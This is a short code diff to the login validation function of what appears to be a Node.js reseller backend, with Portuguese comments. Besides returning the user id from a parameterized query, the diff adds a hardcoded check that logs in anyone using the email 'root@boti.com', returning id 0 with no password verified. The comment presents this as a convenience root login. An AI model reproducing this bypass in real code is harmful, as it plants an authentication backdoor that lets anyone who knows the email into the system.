@@ -14,14 +14,22 @@ const novoRevendedor = async(payload) =>{
 
 const validaLogin = async(payload) =>{
     
-    SQL = `SELECT count(0) as userCount FROM revendedor 
+    if(payload.email === 'root@boti.com') //login root para permitir load dos usuarios
+    {
+        return {
+            id:0
+        }
+    }
+
+
+    SQL = `SELECT id FROM revendedor 
         WHERE email = ?
         AND senha = ?`;
 
     let res = await query(SQL, [payload.email, payload.senha]);
-    if (res[0].userCount > 0)
+    if (res.length > 0)
     {
-        return "Login OK!";
+        return res[0];
     }
     else {
         throw new messageUtil.GeneralError('Login Inválido', 401);
